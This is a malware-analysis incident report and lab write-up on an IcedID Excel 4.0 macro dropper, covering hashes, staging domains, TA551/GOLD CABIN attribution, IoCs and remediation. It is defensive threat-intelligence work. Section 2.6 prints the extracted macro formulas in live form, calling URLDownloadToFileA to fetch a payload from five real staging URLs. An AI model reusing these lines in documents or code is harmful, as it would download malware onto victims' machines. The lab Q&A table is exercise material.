# Incident Report: IcedID – Malicious Excel 4.0 (XLM) Macro Dropper, TA551 / GOLD CABIN Attribution & Second-Stage Payload Triage

| Metadata | Details | 
| ----- | ----- | 
| **Date** | November 2026 | 
| **Analyst** | Piotr Asyngier | 
| **Tools Used** | VirusTotal, Recorded Future Triage, MITRE ATT&CK | 
| **Category** | Threat Intelligence, Malicious Document Analysis & Malware Triage | 
| **Target Sample (SHA-1 / SHA-256)** | `191eda0c539d284b29efe556abb05cd75a9077a0` / `d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d` | 

## 1. Executive Summary

During a threat intelligence and malware triage investigation, a suspicious SHA-1 hash (`191eda0c539d284b29efe556abb05cd75a9077a0`) recovered from `hash.txt` was analyzed across **VirusTotal**, **Recorded Future Triage**, and the **MITRE ATT&CK** knowledge base. The investigation reconstructed the initial delivery and execution mechanics of an **IcedID** (BokBot) banking trojan campaign (`Campaign ID: 3717128962`).

The analysis confirmed the following attack chain and attribution details:

1. **Malicious Document Delivery:** The hash corresponds to a `105.53 KB` macro-enabled Microsoft Excel spreadsheet named **`document-1982481273.xlsm`** containing obfuscated Excel 4.0 (`XLM`) macros.

2. **Execution & Payload Staging (`URLDownloadToFileA`):** Upon enabling macros, the XLM script invokes the Windows API function **`URLDownloadToFileA`** (via `URLMon`) to attempt downloading a masqueraded second-stage payload (**`3003.gif`**) from **`5`** distinct compromised/attacker-controlled domains, saving the payload locally as `..\ksjvoefv.skd[1-4]`.

3. **Infrastructure & Attribution (`GOLD CABIN`):** Threat intelligence correlation linked the `.com` staging infrastructure to the **`NameCheap`** registrar (`NameCheap, Inc.`) and attributed the IcedID distribution campaign to the financially motivated threat group **`TA551`** (`G0127`), also tracked as **`GOLD CABIN`** (*Shathak*), communicating with C2 domain `usaaforced[.]fun`.

## 2. Threat Intelligence & Technical Analysis

### 2.1. Malicious File Identification (`document-1982481273.xlsm`)

Querying the provided SHA-1 hash (`191eda0c539d284b29efe556abb05cd75a9077a0`) on **VirusTotal** resolved to `SHA-256: d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d`. Inspecting the **Details** tab revealed the document's file type, metadata, and submission names.

* **File Metadata Findings:**

  * **File Type:** Microsoft Excel 2007+ (`Office Open XML spreadsheet`, `105.53 KB` / `108,063 bytes`, containing `24` embedded files).

  * **First Submission to VirusTotal:** `2021-03-31 01:39:08 UTC`

  * **Associated Filename (Names List):** **`document-1982481273.xlsm`**


<img width="1853" height="964" alt="obraz" src="https://github.com/user-attachments/assets/6da9577d-cc76-46d0-ac4d-7d234629ee43" />


### 2.2. Deployed Second-Stage GIF Payload Identification (`3003.gif`)

Pivoting to the **Behavior** tab (`Activity Summary -> Files Dropped`) in VirusTotal exposed the artifacts created on the filesystem during sandbox detonation of `document-1982481273.xlsm`.

* **Findings:**

  * Multiple cached copies of a masqueraded GIF payload were written to the Internet Explorer cache (`c:\users\<user>\appdata\local\microsoft\windows\inetcache\ie\...\3003[1].gif`) alongside dropped loader files (`ksjvoefv.skd`, `ksjvoefv.skd3`, `ksjvoefv.skd4`).

  * **Deployed GIF Filename:** **`3003.gif`**

<img width="1853" height="964" alt="obraz" src="https://github.com/user-attachments/assets/34a7c959-720e-4224-8c63-ccd5bd505b2f" />


### 2.3. Payload Distribution Domains Enumeration (`5` Domains)

Examining the **Relations** tab (`Contacted URLs`) in VirusTotal—and cross-referencing with the extracted XLM 4.0 configuration in Recorded Future Triage—revealed the exact list of fallback staging URLs queried by the macro to download `3003.gif`.

* **Contacted Payload URLs (`5` Domains Total):**

  1. `hxxps://metaflip[.]io/ds/3003.gif`
  2. `hxxps://partsapp[.]com[.]br/ds/3003.gif`
  3. `hxxps://columbia[.]aula-web[.]net/ds/3003.gif`
  4. `hxxps://tajushariya[.]com/ds/3003.gif`
  5. `hxxps://agenbolatermurah[.]com/ds/3003.gif`

* **Total Domains Used to Download `3003.gif`:** **`5`**

<img width="1853" height="964" alt="obraz" src="https://github.com/user-attachments/assets/d68ad31f-1e2c-417e-abec-e8209e6de6d3" />


### 2.4. DNS Registrar Attribution (`NameCheap`)

Inspecting the **Contacted Domains** table under the VirusTotal **Relations** tab revealed the WHOIS registrar metadata for the `.com` domains serving `/ds/3003.gif`.

* **Findings:**

  * **`agenbolatermurah[.]com`** (`6/92` detections) — Registrar: **`NameCheap, Inc.`**

  * **Primary `.com` Registrar Identified:** **`NameCheap`**

<img width="1853" height="964" alt="obraz" src="https://github.com/user-attachments/assets/321e6b94-334f-4f34-acc1-4aae34f8ce29" />


### 2.5. Threat Actor Attribution (`GOLD CABIN`)

Correlating the IcedID XLM macro TTPs and campaign telemetry with **MITRE ATT&CK** threat group profiles linked this activity to **`TA551`** (`ID: G0127`), a financially motivated threat actor active since at least 2018 known for email-based distribution of IcedID, Valak, and Ursnif.

* **MITRE ATT&CK Group Mapping (`G0127` / `TA551`):**

  * **Associated Group Names:** **`GOLD CABIN`**, `Shathak`

  * **Attributed Threat Actor:** **`GOLD CABIN`**

<img width="1853" height="964" alt="obraz" src="https://github.com/user-attachments/assets/31d5d863-61b7-4579-b21a-96be60fc7757" />


### 2.6. Execution Phase API Function Analysis (`URLDownloadToFileA`)

Reviewing the static configuration extracted from the Excel 4.0 (`xlm4.0`) macro in **Recorded Future Triage** revealed the exact Windows API call leveraged to fetch `3003.gif` onto the victim host.

* **Extracted XLM 4.0 Macro Source (`Recorded Future Triage`):**

  ```excel
  =CALL("URLMon", "URLDownloadToFileA", "JCCB", 0, "https://metaflip.io/ds/3003.gif", "..\ksjvoefv.skd")
  =CALL("URLMon", "URLDownloadToFileA", "JCCB", 0, "https://partsapp.com.br/ds/3003.gif", "..\ksjvoefv.skd1")
  =CALL("URLMon", "URLDownloadToFileA", "JCCB", 0, "https://columbia.aula-web.net/ds/3003.gif", "..\ksjvoefv.skd2")
  =CALL("URLMon", "URLDownloadToFileA", "JCCB", 0, "https://tajushariya.com/ds/3003.gif", "..\ksjvoefv.skd3")
  =CALL("URLMon", "URLDownloadToFileA", "JCCB", 0, "https://agenbolatermurah.com/ds/3003.gif", "..\ksjvoefv.skd4")
  ```

* **Additional Extracted Telemetry:**

  * **Malware Family:** `icedid`

  * **Campaign ID:** `3717128962`

  * **C2 Domain:** `usaaforced[.]fun`

  * **Execution Download Function:** **`URLDownloadToFileA`**

<img width="1853" height="964" alt="obraz" src="https://github.com/user-attachments/assets/323d1239-204e-407b-b502-a93c4054178f" />


## 3. Malware Lifecycle & Execution Flow

| Stage | Component / Action | Details | 
| ----- | ----- | ----- | 
| **1. Delivery** | `document-1982481273.xlsm` | Delivered via email phishing campaign attributed to `TA551` / `GOLD CABIN` (First seen on VT: `2021-03-31 01:39 UTC`). | 
| **2. Execution** | Excel 4.0 (`XLM`) Macro | Executes `=CALL("URLMon", "URLDownloadToFileA", ...)` to fetch the second-stage payload without spawning `powershell.exe` or `cmd.exe` for the initial download. | 
| **3. Staging** | `3003.gif` -> `ksjvoefv.skd[1-4]` | Iterates across `5` staging domains (`/ds/3003.gif`) and writes the downloaded payload locally as `..\ksjvoefv.skd*`. | 
| **4. C2 Communication** | `usaaforced[.]fun` | Initiates IcedID (`Campaign 3717128962`) command-and-control beaconing. | 

## 4. Consolidated Indicators of Compromise (IoCs)

| Indicator Type | Value (Defanged) | Context | 
| ----- | ----- | ----- | 
| **SHA-1 Hash** | `191eda0c539d284b29efe556abb05cd75a9077a0` | Malicious Excel 4.0 macro document (`document-1982481273.xlsm`) | 
| **SHA-256 Hash** | `d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d` | SHA-256 hash of `document-1982481273.xlsm` (`108,063 B`) | 
| **Staging URLs (`5`)** | `hxxps://metaflip[.]io/ds/3003.gif`<br>`hxxps://partsapp[.]com[.]br/ds/3003.gif`<br>`hxxps://columbia[.]aula-web[.]net/ds/3003.gif`<br>`hxxps://tajushariya[.]com/ds/3003.gif`<br>`hxxps://agenbolatermurah[.]com/ds/3003.gif` | Fallback URLs queried via `URLDownloadToFileA` | 
| **C2 Domain** | `usaaforced[.]fun` | IcedID C2 server (`Campaign 3717128962`) | 
| **Dropped Artifacts** | `3003.gif`, `ksjvoefv.skd`, `ksjvoefv.skd1`–`ksjvoefv.skd4` | Masqueraded second-stage IcedID loader files | 
| **Threat Actor** | `GOLD CABIN` (`TA551` / `G0127` / `Shathak`) | Financially motivated IcedID distributor | 

## 5. Summary of Lab Questions & Answers

| Question | Answer | 
| ----- | ----- | 
| **Q1:** What is the name of the file associated with the given hash? | `document-1982481273.xlsm` | 
| **Q2:** Can you identify the filename of the GIF file that was deployed? | `3003.gif` | 
| **Q3:** How many domains does the malware look to download the additional payload file in Q2? | `5` | 
| **Q4:** Specify the Registrar INC of the domain that ends with `.com`. | `NameCheap` | 
| **Q5:** Could you specify the threat actor linked to the sample provided? | `GOLD CABIN` | 
| **Q6:** In the Execution phase, what function does the malware employ to fetch extra payloads onto the system? | `URLDownloadToFileA` | 

## 6. MITRE ATT&CK Mapping & Remediation

### MITRE ATT&CK Techniques

* **`T1566.001` – Phishing: Spearphishing Attachment:** Distributing `document-1982481273.xlsm` via email campaigns operated by `TA551` / `GOLD CABIN`.

* **`T1204.002` – User Execution: Malicious File:** Relying on the victim to open the Excel spreadsheet and enable macros.

* **`T1106` – Native API:** Calling `URLDownloadToFileA` from `URLMon.dll` directly through Excel 4.0 (`XLM`) `=CALL()` formulas.

* **`T1105` – Ingress Tool Transfer:** Downloading `3003.gif` from `5` external staging domains and saving it as `ksjvoefv.skd*`.

* **`T1036` – Masquerading:** Disguising the second-stage IcedID payload with a `.gif` extension (`3003.gif`).

### Recommended Remediation Actions

1. **Disable Excel 4.0 (XLM) Macros:** Enforce Microsoft 365 / Group Policy controls to **disable Excel 4.0 macros** by default and block macros in files downloaded from the Internet (Mark of the Web / MOTW).

2. **Network & DNS Blocking:** Block all five staging domains (`metaflip[.]io`, `partsapp[.]com[.]br`, `columbia[.]aula-web[.]net`, `tajushariya[.]com`, `agenbolatermurah[.]com`) as well as the C2 domain (`usaaforced[.]fun`) across web proxies, firewalls, and DNS sinkholes.

3. **Endpoint Hunting & ASR Rules:** Enable Microsoft Defender Attack Surface Reduction (ASR) rules to block Office applications from creating child processes or executable content, and hunt endpoints for `ksjvoefv.skd*` files or suspicious `EXCEL.EXE` network connections.
